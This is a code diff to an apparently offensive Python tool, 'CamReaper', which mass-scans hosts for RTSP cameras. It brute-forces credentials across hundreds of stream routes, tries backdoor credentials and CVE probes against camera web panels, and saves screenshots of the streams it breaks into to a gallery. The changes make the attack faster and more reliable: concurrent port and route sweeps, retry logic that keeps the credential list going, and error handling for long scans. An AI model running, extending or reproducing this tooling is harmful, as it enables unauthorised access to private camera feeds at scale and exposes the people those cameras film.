@@ -21,7 +21,7 @@ from pathlib import Path
 
 from CamReaper import report
 from CamReaper.report import record_failed, record_gallery, record_http_cve, record_no_auth, record_url
-from CamReaper.rtsp import RTSPClient, Status
+from CamReaper.rtsp import RTSPClient
 from CamReaper.vendor import detect_vendor
 
 DUMMY_ROUTE = "/0x8b6c42"
@@ -31,7 +31,28 @@ DUMMY_ROUTE = "/0x8b6c42"
 # silent mid-brute would otherwise burn ~two socket timeouts per credential.
 MAX_TRANSPORT_FAILS = 2
 
+# Ports of one host probed at the same time.  Most targets in a large scan are
+# dead, and probing the ports one after another costs timeout-per-port per
+# host; 4 keeps the socket count sane while cutting that wait ~4x.
+PORT_PARALLEL = 4
+
 AUTH_CODES = {"401", "403"}
+
+
+def _is_mute_host(client: RTSPClient, code: str) -> bool:
+    """True when the host took the connection but never answered the request.
+
+    Only a *timeout* is expensive: the socket is open, so every further route
+    costs a full socket timeout.  A refused connection, or a socket the camera
+    hangs up on without a reply, is its cheap way of saying "no such route" -
+    and plenty of cameras answer every wrong route exactly like that.  Those
+    must never abort a route sweep, otherwise a stream served only under an
+    unusual path (Hikvision query routes, DVR channel paths, ...) is never
+    reached.
+    """
+    if code:
+        return False  # any status code - 404 included - is the host talking
+    return client.last_error == "timeout"
 
 
 @dataclass
@@ -55,9 +76,7 @@ class Settings:
     credentials: list = field(default_factory=list)
     timeout: float = 2.0
     host_concurrency: int = 200
-    failed_file: Path = None  # log reachable-but-unconfirmed hosts here
     failed_with_error: bool = False
-    no_auth_file: Path = None  # log hosts where no credential worked
     screenshot_concurrency: int = 20
     pics_dir: Path = field(default_factory=lambda: Path("pics"))
     enable_screenshots: bool = True
@@ -75,7 +94,7 @@ class Settings:
     no_http: bool = False  # disable HTTP CVE-probe fallback
 
 
-async def _try_auth(client: RTSPClient, cred: str, route: str):
+async def try_auth(client: RTSPClient, cred: str, route: str):
     """One authenticated DESCRIBE tolerant of dropped keep-alive sockets.
 
     Returns ``(status_code, still_connected)``.
@@ -99,7 +118,7 @@ async def _reconnect(client: RTSPClient, attempts: int = 3) -> bool:
     caller level by throttling how often we open fresh connections.
     """
     pause = 0.15
-    for i in range(attempts):
+    for _ in range(attempts):
         if client.is_connected:
             return True
         if await client.connect(client.port):
@@ -109,89 +128,171 @@ async def _reconnect(client: RTSPClient, attempts: int = 3) -> bool:
     return False
 
 
-async def _probe_routes(
-    client: RTSPClient, routes, cred: str, route_parallel: int, deadline=None,
-    max_transport_fails: int = 2,
+async def _probe_routes_serial(
+    client: RTSPClient, routes, cred: str, deadline=None,
+    max_transport_fails: int = MAX_TRANSPORT_FAILS,
 ):
-    if route_parallel <= 1:
-        return await _probe_routes_serial(client, routes, cred, deadline, max_transport_fails)
-    return await _probe_routes_parallel(client, routes, cred, route_parallel, deadline)
-
-
-async def _probe_routes_serial(client: RTSPClient, routes, cred: str, deadline=None, max_transport_fails: int = 2):
     """Return the first route that yields 200 with ``cred`` (or None).
 
     A fresh TCP connection is used for every route once the current one has
     answered 401: many cameras (Hikvision among them) start refusing even
     their open routes mid-session after a burst of 401s on the SAME socket,
-    but happily serve them 200 on a brand-new connection.  We reset the
-    socket before each route lazily so hosts that answer 200 immediately
-    stay on the fast keep-alive path.
+    but happily serve them 200 on a brand-new connection.  The socket is reset
+    lazily so hosts that answer 200 immediately stay on the fast keep-alive
+    path.
     """
-    transport_fails = 0
+    mutes = 0
     need_fresh = False
-    now = asyncio.get_running_loop().time
+    loop = asyncio.get_running_loop()
     for route in routes:
-        if deadline is not None and now() >= deadline:
+        if deadline is not None and loop.time() >= deadline:
             return None
         if need_fresh:
             client.close()
             need_fresh = False
         if not client.is_connected and not await _reconnect(client):
             return None
-        code, _ = await _try_auth(client, cred, route)
+        code, _ = await try_auth(client, cred, route)
         if code == "200":
             return route
         if code in AUTH_CODES:
             need_fresh = True
-            transport_fails = 0
+            mutes = 0
             continue
-        transport_fails += 1
-        if transport_fails >= max_transport_fails:
-            return None
+        if _is_mute_host(client, code):
+            # Socket open, nothing came back: every further route would burn
+            # the same full timeout, so give up on this host.
+            mutes += 1
+            if mutes >= max_transport_fails:
+                return None
+            continue
+        if code:
+            mutes = 0
+        # No status line, but a closed/refused socket: the camera hung up on us,
+        # which is its normal "no such route" answer.  Reconnect and keep going.
+        client.close()
     return None
 
 
-async def _probe_routes_parallel(
-    client: RTSPClient, routes, cred: str, route_parallel: int, deadline=None
-):
-    """Return the first route that yields 200 with ``cred`` (or None).
+async def _sweep_routes(
+    ip: str, port: int, timeout: float, routes, cred: str, parallel: int,
+    deadline=None, first_only: bool = True,
+    max_transport_fails: int = MAX_TRANSPORT_FAILS,
+) -> list:
+    """Probe ``routes`` in parallel stripes; return the routes that answered 200.
 
-    Each route is probed on its own fresh connection, bounded by
-    ``route_parallel`` concurrent slots.  The first ``200`` wins.
+    ``parallel`` stripes are split round-robin over the route list and each
+    stripe walks its own routes on a fresh connection (a camera that answered
+    401 refuses even its open route on the same socket, so a new connection per
+    route is what keeps the sweep reliable).  Workers - and therefore concurrent
+    connections and in-flight tasks - stay bounded by ``parallel`` instead of
+    growing with the route list, which matters on the 800+-route wordlist.
+
+    With ``first_only`` the sweep stops as soon as one route opens.
     """
-    sem = asyncio.Semaphore(route_parallel)
-    result: str = None
-    _lock = asyncio.Lock()
-    _done = asyncio.Event()
+    routes = list(routes)
+    hits: list = []
+    if not routes:
+        return hits
+    workers = min(parallel, len(routes)) if parallel > 1 else 1
+    loop = asyncio.get_running_loop()
+    stop = asyncio.Event() if first_only else None
+    lock = asyncio.Lock()
 
-    async def _try_one(route: str):
-        nonlocal result
-        if _done.is_set() or result is not None:
-            return
-        if deadline is not None and asyncio.get_running_loop().time() >= deadline:
-            return
-        async with sem:
-            if _done.is_set() or result is not None:
-                return
-            fresh = RTSPClient(client.ip, client.port, client.timeout, ":")
-            if not await fresh.connect():
-                return
-            try:
-                code, _ = await _try_auth(fresh, cred, route)
+    async def _stripe(stripe_routes):
+        client = RTSPClient(ip, port, timeout, ":")
+        mutes = 0
+        try:
+            for route in stripe_routes:
+                if stop is not None and stop.is_set():
+                    return
+                if deadline is not None and loop.time() >= deadline:
+                    return
+                client.close()
+                if not await client.connect(port):
+                    return  # host gone: every other stripe would fail too
+                code, _ = await try_auth(client, cred, route)
                 if code == "200":
-                    async with _lock:
-                        if result is None:
-                            result = route
-                            _done.set()
-            except Exception:
-                pass
-            finally:
-                fresh.close()
+                    async with lock:
+                        hits.append(route)
+                    mutes = 0
+                    if stop is not None:
+                        stop.set()
+                        return
+                elif code in AUTH_CODES:
+                    mutes = 0
+                elif _is_mute_host(client, code):
+                    # The socket is open and the camera stayed silent: this is
+                    # the one failure that costs a full timeout, so a couple in
+                    # a row mean the rest of the stripe would burn time for
+                    # nothing.
+                    mutes += 1
+                    if mutes >= max_transport_fails:
+                        return
+                else:
+                    # No status line, but the camera hung up on us (or the
+                    # route is a plain 404): that is its cheap "no such route"
+                    # answer, so the stripe keeps going instead of giving up.
+                    if code:
+                        mutes = 0
+        except Exception:
+            pass
+        finally:
+            client.close()
 
-    tasks = [asyncio.create_task(_try_one(r)) for r in routes]
+    stripes = [routes[i::workers] for i in range(workers)]
+    tasks = [asyncio.create_task(_stripe(stripe)) for stripe in stripes]
     await asyncio.gather(*tasks, return_exceptions=True)
-    return result
+    if hits:
+        # Report hits in route order, not in completion order, so the result
+        # does not depend on which stripe got lucky.
+        order = {route: i for i, route in enumerate(routes)}
+        hits.sort(key=lambda route: order.get(route, len(routes)))
+    return hits
+
+
+async def _probe_routes(
+    client: RTSPClient, routes, cred: str, route_parallel: int, deadline=None,
+    max_transport_fails: int = MAX_TRANSPORT_FAILS,
+):
+    """First route that answers 200 with ``cred``, reusing ``client`` if serial."""
+    if route_parallel <= 1:
+        return await _probe_routes_serial(
+            client, routes, cred, deadline, max_transport_fails
+        )
+    hits = await _sweep_routes(
+        client.ip, client.port, client.timeout, routes, cred, route_parallel,
+        deadline, first_only=True, max_transport_fails=max_transport_fails,
+    )
+    return hits[0] if hits else None
+
+
+async def probe_first_open_route(
+    ip: str, port: int, timeout: float, routes, cred: str = ":",
+    parallel: int = 0, deadline=None,
+    max_transport_fails: int = MAX_TRANSPORT_FAILS,
+):
+    """Return the first of ``routes`` that answers 200 on ``ip:port`` (or None).
+
+    Standalone variant of :func:`_probe_routes` that does not need a
+    pre-connected client - used by the CVE engine, which works on its own
+    sockets.  ``parallel <= 1`` means serial.
+    """
+    if parallel <= 1:
+        client = RTSPClient(ip, port, timeout, ":")
+        try:
+            if not await client.connect(port):
+                return None
+            return await _probe_routes_serial(
+                client, routes, cred, deadline, max_transport_fails
+            )
+        finally:
+            client.close()
+    hits = await _sweep_routes(
+        ip, port, timeout, routes, cred, parallel, deadline, first_only=True,
+        max_transport_fails=max_transport_fails,
+    )
+    return hits[0] if hits else None
 
 
 async def probe_all_routes(
@@ -200,61 +301,21 @@ async def probe_all_routes(
     """Return EVERY route (from ``routes``) that answers 200 on ``client``.
 
     Used by ``--scan-channels`` to discover all open streams of one confirmed
-    camera - unlike ``_probe_routes`` (which stops at the first hit) this keeps
-    the whole set so a multi-channel DVR yields every channel, not just one.
+    camera - unlike :func:`_probe_routes` (which stops at the first hit) this
+    keeps the whole set so a multi-channel DVR yields every channel, not just
+    one.
 
     Each route is tried on a fresh connection with ``creds``.  ``route_parallel``
     bounds concurrency (<=1 = serial).  Only plain ``200`` responses count; 401s
     and transport failures are skipped.  Returns the list of open routes (each
     starting with ``/``), possibly empty.
     """
-    ip, port, timeout = client.ip, client.port, client.timeout
-    routes = list(routes)
     if not routes:
         return []
-
-    if route_parallel <= 1:
-        return await _probe_all_serial(ip, port, timeout, routes, creds)
-
-    sem = asyncio.Semaphore(route_parallel)
-    found: list = []
-    lock = asyncio.Lock()
-
-    async def _try_one(route: str):
-        async with sem:
-            fresh = RTSPClient(ip, port, timeout, creds)
-            if not await fresh.connect():
-                return
-            try:
-                code, _ = await _try_auth(fresh, creds, route)
-                if code == "200":
-                    async with lock:
-                        found.append(route)
-            except Exception:
-                pass
-            finally:
-                fresh.close()
-
-    tasks = [asyncio.create_task(_try_one(r)) for r in routes]
-    await asyncio.gather(*tasks, return_exceptions=True)
-    return found
-
-
-async def _probe_all_serial(ip, port, timeout, routes, creds) -> list:
-    found: list = []
-    for route in routes:
-        fresh = RTSPClient(ip, port, timeout, creds)
-        if not await fresh.connect():
-            continue
-        try:
-            code, _ = await _try_auth(fresh, creds, route)
-            if code == "200":
-                found.append(route)
-        except Exception:
-            pass
-        finally:
-            fresh.close()
-    return found
+    return await _sweep_routes(
+        client.ip, client.port, client.timeout, routes, creds,
+        max(1, route_parallel), first_only=False,
+    )
 
 
 def _failure_reason(client: RTSPClient, code: str) -> str:
@@ -265,11 +326,74 @@ def _failure_reason(client: RTSPClient, code: str) -> str:
     """
     if code:
         return f"rtsp-{code}"
-    if client.status is Status.TIMEOUT:
-        return "timeout"
-    if client.status is Status.UNIDENTIFIED:
-        return "error"
-    return "no-response"
+    return client.last_error or "no-response"
+
+
+async def _probe_port(ip: str, port: int, timeout: float):
+    """Classify one RTSP port of a host.
+
+    Returns ``(state, client, vendor)`` where ``state`` is one of:
+      * ``closed``      - nothing listening (client already discarded);
+      * ``unconfirmed`` - the socket opened but no valid RTSP answer arrived;
+      * ``open``        - no credentials needed and ``/`` is confirmed;
+      * ``gate``        - 200 on a dummy route but ``/`` is gated;
+      * ``auth``        - answered 401/403, i.e. it wants credentials.
+    """
+    client = RTSPClient(ip, port, timeout, ":")
+    if not await client.connect(port):
+        return "closed", client, ""
+    await client.authorize(port, DUMMY_ROUTE, ":")
+    code = client.status_code
+    # The camera answers 200 to an arbitrary (dummy) route, so it needs no
+    # password.  But only ``rtsp://ip:port/`` is recorded once ``/`` itself is
+    # actually confirmed - a camera that 200s on the dummy yet gates ``/``
+    # (Hikvision-style query-route cameras, etc.) must not produce a bogus
+    # open-stream URL.  Such a host is kept as ``live`` and left to the
+    # no-credential route sweep to pin down for real.
+    # (Note: some cameras close the socket right after answering, so the
+    # confirming probe can fail at the transport level even for healthy hosts -
+    # never treat that as a reason to skip the host.)
+    if code == "200":
+        await client.authorize(port, "/", ":")
+        if client.status_code == "200":
+            return "open", client, detect_vendor(client.data)
+        return "gate", client, detect_vendor(client.data)
+    if code in AUTH_CODES:
+        return "auth", client, detect_vendor(client.data)
+    return "unconfirmed", client, ""
+
+
+async def _probe_ports(ip: str, s: Settings) -> list:
+    """Probe every configured port of one host, up to ``PORT_PARALLEL`` at once.
+
+    Returns the per-port ``(state, client, vendor)`` tuples **in port order**,
+    so which port wins does not depend on which answer came back first.  Most
+    targets in a large scan have all their ports closed, and doing that one
+    port after another costs a full socket timeout per port per host.
+    """
+    ports = list(s.ports)
+    if not ports:
+        return []
+    if len(ports) == 1:
+        return [await _probe_port(ip, ports[0], s.timeout)]
+
+    results: dict = {}
+    cursor = 0
+
+    async def _worker():
+        nonlocal cursor
+        while True:
+            index = cursor
+            if index >= len(ports):
+                return
+            cursor = index + 1
+            results[index] = await _probe_port(ip, ports[index], s.timeout)
+
+    workers = min(PORT_PARALLEL, len(ports))
+    await asyncio.gather(
+        *(asyncio.create_task(_worker()) for _ in range(workers))
+    )
+    return [results[i] for i in range(len(ports))]
 
 
 async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
@@ -281,45 +405,38 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
     found: list = []
 
     # ---- stage 1: find a live port that "responds" (200/401/403) ----
+    # Ports are probed concurrently and then judged in the order the user asked
+    # for them, so the winner never depends on which answer came back first.
+    results = await _probe_ports(ip, s)
     live: RTSPClient = None
     vendor = "Generic"
-    for port in s.ports:
-        client = RTSPClient(ip, port, s.timeout, ":")
-        if not await client.connect(port):
-            continue
-        await client.authorize(port, DUMMY_ROUTE, ":")
-        code = client.status_code
-        if code == "200":
-            # The camera answers 200 to an arbitrary (dummy) route, so it needs
-            # no password.  But only ``rtsp://ip:port/`` is recorded once ``/``
-            # itself is actually confirmed - a camera that 200s on the dummy yet
-            # gates ``/`` (Hikvision-style query-route cameras, etc.) must not
-            # produce a bogus open-stream URL.  Such a host is kept as ``live``
-            # and left to the no-credential route sweep to pin down for real.
-            # (Note: some cameras close the socket right after answering, so the
-            # confirming probe can fail at the transport level even for healthy
-            # hosts - never treat that as a reason to skip the host.)
-            await client.authorize(port, "/", ":")
-            if client.status_code == "200":
-                found.append(Found(ip, port, "/", ":", vendor))
-                client.close()
-                return found
-            live = client
-            vendor = detect_vendor(client.data) if client.data else "Generic"
+    open_port = None  # (client, vendor) for a passwordless confirmed stream
+    winner = -1
+    for index, (state, client, port_vendor) in enumerate(results):
+        if state == "open":
+            winner, open_port = index, (client, port_vendor or "Generic")
             break
-        if code in AUTH_CODES:
-            live = client
-            vendor = detect_vendor(client.data) if client.data else "Generic"
+        if state in ("auth", "gate"):
+            winner, live, vendor = index, client, port_vendor or "Generic"
             break
-        # Port was open (TCP established) but no valid RTSP response came
-        # back - a reachable-but-unconfirmed host.  Only these are logged,
-        # and only when the user opted in via --failed-file.
-        await record_failed(
-            ip,
-            port,
-            _failure_reason(client, code) if s.failed_with_error else "",
-        )
+        if state == "unconfirmed":
+            # Port was open (TCP established) but no valid RTSP response came
+            # back - a reachable-but-unconfirmed host.  Only these are logged,
+            # and only when the user opted in via --failed-file.
+            await record_failed(
+                ip, client.port,
+                _failure_reason(client, "") if s.failed_with_error else "",
+            )
         client.close()
+    # Release the sockets of the ports that lost the race.
+    for index, (_state, client, _vendor) in enumerate(results):
+        if index != winner:
+            client.close()
+
+    if open_port is not None:
+        found.append(Found(ip, open_port[0].port, "/", ":", open_port[1]))
+        open_port[0].close()
+        return found
 
     if live is None:
         # No live RTSP port.  In 'cve'/'combined' mode, fall back to probing
@@ -376,12 +493,22 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
 
         cve_found = await run_cve_stage(
             ip, live, vendor, s.cve_db, s.route_parallel, s.http_timeout,
-            stats,
+            stats, http_ports=s.http_ports, routes=s.routes,
         )
-        if cve_found:
-            if stats is not None:
-                stats["cve_found"] = stats.get("cve_found", 0) + len(cve_found)
-            found.extend(cve_found)
+        for f in cve_found:
+            found.append(f)
+            if stats is None:
+                continue
+            if f.is_http_cve:
+                # A vulnerable web panel is not a stream: counted by the
+                # caller in http_found, not in cve_found.
+                continue
+            stats["cve_found"] = stats.get("cve_found", 0) + 1
+        if any(not f.is_http_cve for f in cve_found):
+            # A confirmed RTSP stream from a backdoor credential: the host is
+            # done.  HTTP-only hits deliberately fall through to stage 4, so a
+            # vulnerable web panel never suppresses the brute-force of a host
+            # that also answers RTSP.
             live.close()
             return found
 
@@ -416,7 +543,7 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
             if now < next_allowed:
                 await asyncio.sleep(next_allowed - now)
             next_allowed = max(now, next_allowed) + interval
-        code, live_ok = await _try_auth(live, cred, "/")
+        code, live_ok = await try_auth(live, cred, "/")
         if code == "200":
             found.append(Found(ip, live.port, "/", cred, vendor))
             live.close()
@@ -438,15 +565,25 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
             # burst of 401s on the same socket.
             transport_fails = 0
             need_fresh = True
-        else:
-            # Transport trouble (read timeout / dropped socket mid-request) or a
-            # server-side error: a flaky-or-blocking unit.  Don't grind every
-            # remaining credential through it.  (A clean 401 that just closes
-            # the socket afterwards is NOT a flake - many cameras do that and
-            # the next credential legitimately reconnects.)
+        elif _is_mute_host(live, code):
+            # Socket open, nothing came back: don't grind every remaining
+            # credential through a camera that is up but mute.  (A clean 401
+            # that just closes the socket afterwards is NOT a mute - many
+            # cameras do that and the next credential legitimately reconnects.)
             transport_fails += 1
             if transport_fails >= s.max_transport_fails:
                 break
+        elif code:
+            # A real status code (404 handled above, 4xx/5xx here): the unit is
+            # answering, so keep trying credentials on a fresh connection.
+            transport_fails = 0
+            need_fresh = True
+        else:
+            # No status line, but the camera hung up on us: its cheap "no such
+            # route" answer, not a flake.  Reconnect and try the next
+            # credential - this is what a camera that closes the socket after
+            # every 401 looks like, and bailing out here loses the whole list.
+            need_fresh = True
 
     live.close()
     if not found:
@@ -494,6 +631,12 @@ async def _screenshot_worker(queue: asyncio.Queue, s: Settings, counter: dict):
                     counter["found_no_frame"] += int(not bool(pic))
                     if pic:
                         await record_gallery(url, f"pics/{Path(pic).name}")
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            # A failing capture or report write must cost this one frame, not
+            # the worker: a dead worker would silently stop the gallery.
+            counter["errors"] += 1
         finally:
             queue.task_done()
 
@@ -512,7 +655,11 @@ async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dic
     without it the watchdog prints one line per tick.
     """
     sem = asyncio.Semaphore(s.host_concurrency)
-    result_queue: asyncio.Queue = asyncio.Queue()
+    # Bounded: hosts hand their capture to the workers and wait when the queue
+    # is full, so a fast scan cannot pile up frames faster than they are shot.
+    result_queue: asyncio.Queue = asyncio.Queue(
+        maxsize=max(4 * s.screenshot_concurrency, 16)
+    )
 
     stats = {
         "checked": 0,
@@ -525,6 +672,10 @@ async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dic
         "cve_tested": 0,  # CVE exploits tested
         "http_checked": 0,  # HTTP ports probed for CVE exploits
         "http_found": 0,  # HTTP ports with matched CVE exploits
+        "errors": 0,  # hosts that raised instead of being classified
+        # First few failures, verbatim: a swallowed exception is a host that
+        # silently produces no findings, so it has to stay visible.
+        "error_samples": [],
     }
     # ip -> monotonic start time of the in-flight host pipeline, so the
     # watchdog can surface a stalled tail instead of a silent trickle.
@@ -533,13 +684,13 @@ async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dic
     run_started = loop.time()
 
     async def _guard(ip):
-        t_start = asyncio.get_running_loop().time()
+        t_start = loop.time()
         inflight[ip] = t_start
         try:
             async with sem:
-                found = await _handle_host(ip, s, stats)
-                if found:
-                    for f in found:
+                try:
+                    found = await _handle_host(ip, s, stats)
+                    for f in found or ():
                         if f.is_http_cve:
                             # HTTP CVE hit: not an RTSP stream - log it to the
                             # http_cve file and count it separately.
@@ -553,6 +704,19 @@ async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dic
                             vendors[f.vendor] = vendors.get(f.vendor, 0) + 1
                             ports = stats["ports"]
                             ports[str(f.port)] = ports.get(str(f.port), 0) + 1
+                except asyncio.CancelledError:
+                    raise
+                except Exception as exc:
+                    # One bad host - a malformed wordlist line, a full disk, a
+                    # camera answering something unparseable - must not end a
+                    # scan that may still have hours to go.  Count it, keep
+                    # going, and keep the first few messages so a run that
+                    # quietly finds nothing can be diagnosed afterwards.
+                    stats["errors"] += 1
+                    if len(stats["error_samples"]) < 5:
+                        stats["error_samples"].append(
+                            f"{ip}: {type(exc).__name__}: {exc}"
+                        )
                 stats["checked"] += 1
                 if on_counter:
                     on_counter(stats, ip)
@@ -618,8 +782,14 @@ async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dic
                 pending, return_when=asyncio.FIRST_COMPLETED
             )
             for task in done:
-                task.result()  # re-raise exceptions from host pipelines
+                # _guard swallows host errors itself; only cancellation escapes.
+                task.result()
             pending = list(pending_set)
+        # Normal end of the scan: let the capture workers finish every frame
+        # still queued before we tear them down.
+        for _ in workers:
+            await result_queue.put(None)
+        await asyncio.gather(*workers)
     finally:
         aclose = getattr(gen, "aclose", None)
         if aclose is not None:
@@ -627,20 +797,18 @@ async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dic
         if not watchdog.done():
             watchdog.cancel()
             await asyncio.gather(watchdog, return_exceptions=True)
-
-    for _ in workers:
-        await result_queue.put(None)
-    await asyncio.gather(*workers)
-    for t in workers:
-        if not t.done():
-            t.cancel()
+        # Safety net for the error/cancel path: never leave workers pending.
+        for t in workers:
+            if not t.done():
+                t.cancel()
+        await asyncio.gather(*workers, return_exceptions=True)
 
     if on_status is None and on_counter is None:
         # Standalone use (tests / embedding): print a plain summary.
         print(
             f"[done] elapsed={loop.time() - run_started:.0f}s "
             f"checked={stats['checked']} found={stats['found']} "
-            f"screenshots={stats['screenshots']}"
+            f"screenshots={stats['screenshots']} errors={stats['errors']}"
         )
     await report.close_report_files()  # flush + create any pending report files
     return stats
